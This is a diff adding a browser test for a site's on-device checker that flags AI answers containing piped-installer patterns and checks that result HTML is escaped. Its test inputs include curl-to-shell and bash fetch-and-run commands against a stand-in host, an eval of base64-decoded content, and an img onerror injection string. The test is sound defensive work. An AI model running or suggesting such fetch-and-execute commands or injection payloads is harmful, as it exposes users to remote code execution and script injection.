@@ -1,0 +1,32 @@
+const fs=require('node:fs'),assert=require('node:assert/strict');const {chromium}=require('playwright');
+(async()=>{
+ const {explainPS}=await import('../site/src/ps-result.js');
+ const {personTags}=await import('../site/src/catalog.js');const {presentation}=await import('../site/src/presentation.js');
+ const text='🧩 e\u0301 curl https://example.invalid/tool | sh';const normalized=text.normalize('NFC');const chars=Array.from(normalized);const start=chars.join('').indexOf('curl')-1;
+ const record={format:'ai-trust-id-device-preview/v1',state:'FINDING',subject:{codepoint_count:chars.length},candidates:[{code:'PS',signals:[{id:'sig.piped_installer.v3',spans:[[start,chars.length]]}]}]};
+ assert.equal(explainPS(record,text).matches[0].excerpt,'curl https://example.invalid/tool | sh');
+ for(const mutate of [r=>r.state='UNAVAILABLE',r=>r.candidates=[],r=>r.candidates[0].code='SC',r=>r.candidates[0].signals[0].id='unknown.signal',r=>r.candidates[0].signals[0].spans=[[0,999999]],r=>r.candidates[0].signals[0].spans=[[2,1]],r=>r.subject.codepoint_count=0]){
+  const bad=structuredClone(record);mutate(bad);assert.throws(()=>explainPS(bad,text));
+ }
+ const clean={format:record.format,state:'NO_FINDING',subject:record.subject,candidates:[]};assert.equal(explainPS(clean,text).matches.length,0);assert(explainPS(clean,text).next.includes('Do not treat this as'));
+ const base=process.env.AITRUST_SITE_URL||'http://127.0.0.1:5174';const browser=await chromium.launch();const context=await browser.newContext({viewport:{width:390,height:844},bypassCSP:true});const page=await context.newPage();const errors=[],outbound=[];page.on('pageerror',e=>errors.push(e.message));page.on('request',r=>{if(!r.url().startsWith(base)||r.postData())outbound.push(r.url());});
+ try{
+  for(const tag of personTags){await page.goto(base+'/#person/'+tag.id);const dialog=page.getByRole('dialog',{name:tag.name,exact:true});await dialog.waitFor();assert.equal(await dialog.locator('[data-tag-availability]').innerText(),presentation(tag).availability);assert.equal(await dialog.getByRole('button',{name:'Check on this device',exact:true}).count(),tag.id==='PS'?1:0);}
+  await page.goto(base+'/#person/PS');await page.getByRole('button',{name:'Check on this device',exact:true}).click();
+  const cases=[
+   ['curl https://example.invalid/tool | sh','Downloads code'],
+   ['bash -c "$(curl https://example.invalid/tool)"','Puts downloaded output'],
+   ['bash <(curl https://example.invalid/tool)','Hands downloaded code'],
+   ['bash -c "`curl https://example.invalid/tool`"','Inserts downloaded output'],
+   ["eval(base64.b64decode('cHJpbnQoMSk='))",'Passes encoded content'],
+   ['A normal answer about growing tomatoes.','No supported pattern found']
+  ];
+  for(const [input,reason]of cases){await page.getByLabel('AI answer',{exact:true}).fill(input);await page.getByRole('button',{name:'Check answer',exact:true}).click();const result=page.getByRole('region',{name:'Check result'});await result.waitFor({timeout:50000});assert((await result.innerText()).includes(reason),'Missing reason: '+input);assert((await result.locator('[data-ps-checked]').innerText()).includes('PS checked only'));assert(await result.locator('[data-ps-next]').innerText());if(input===cases[0][0]){assert.equal(await result.locator('[data-ps-match] code').innerText(),input);await page.screenshot({path:'output/playwright/ps-explained-result.png'});}}
+  // Rendering a synthetically supplied matched HTML string must be escaped.
+  const fake=await browser.newContext({bypassCSP:true,viewport:{width:320,height:760}});
+  await fake.addInitScript(()=>{window.Worker=class{constructor(){setTimeout(()=>this.onmessage?.({data:{type:'ready'}}),0);}postMessage({id,text}){this.onmessage({data:{type:'result',id,record:{format:'ai-trust-id-device-preview/v1',state:'FINDING',subject:{codepoint_count:Array.from(text.normalize('NFC')).length},models:[{revision:'synthetic-ui-test'}],candidates:[{code:'PS',signals:[{id:'sig.piped_installer.v3',spans:[[0,Array.from(text).length]]}]}]}}});}terminate(){}};});
+  const fp=await fake.newPage();await fp.goto(base+'/#person/PS');await fp.getByRole('button',{name:'Check on this device',exact:true}).click();await fp.getByLabel('AI answer',{exact:true}).fill('<img src=x onerror="window.injected=true">');await fp.getByRole('button',{name:'Check answer',exact:true}).click();await fp.getByRole('region',{name:'Check result'}).waitFor();assert.equal(await fp.locator('[data-ps-match] img').count(),0);assert(!await fp.evaluate(()=>window.injected));assert(await fp.getByRole('region',{name:'Check result'}).evaluate(e=>e.scrollWidth<=e.clientWidth));await fake.close();
+  await page.addScriptTag({path:require.resolve('axe-core/axe.min.js')});const axe=await page.evaluate(()=>window.axe.run(document,{runOnly:{type:'tag',values:['wcag2a','wcag2aa','wcag22aa']}}));assert.equal(axe.violations.length,0);
+  assert.equal(errors.length,0);assert.equal(outbound.length,0);const report={captured_at:new Date().toISOString(),url:base,pass:true,personal_panels:14,website_checker_tags:['PS'],local_only_tags:['PII_REDACTED'],planned_or_proposed_personal_tags:12,real_result_cases:6,reviewed_signal_types:5,invalid_evidence_rejected:7,nfc_codepoint_excerpts:true,input_html_escaped:true,actionable_results:true,axe_violations:0,no_answer_upload:true,errors};fs.writeFileSync(process.env.AITRUST_RESULTS_REPORT||'runs/2026-10-09-ps-results-local.json',JSON.stringify(report,null,2)+'\n');console.log(JSON.stringify(report));
+ }finally{await context.close();await browser.close();}
+})().catch(e=>{console.error(e);process.exitCode=1;});
